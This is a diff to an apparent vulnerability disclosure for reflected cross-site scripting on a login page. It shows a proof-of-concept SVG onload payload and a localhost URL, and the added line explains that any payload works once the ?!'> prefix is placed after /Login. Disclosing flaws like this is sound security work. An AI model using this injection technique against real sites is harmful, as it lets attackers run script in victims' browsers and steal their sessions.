@@ -10,7 +10,9 @@ A Reflected Cross Site Scripting was discovered in the main authentication page 
 
 PoC: 
 
-Payload: ?!'><sVg/OnLoAD=alert`1`//
+Payload: ?!'><sVg/OnLoAD=alert`1`// 
+
+*You can try payload of ur choice, but don't forget to prepend these characters(?!'>) after "/Login"
 
 URL: http://localhost/Login?!%27%3E%3CsVg/OnLoAD=alert`1`//
 
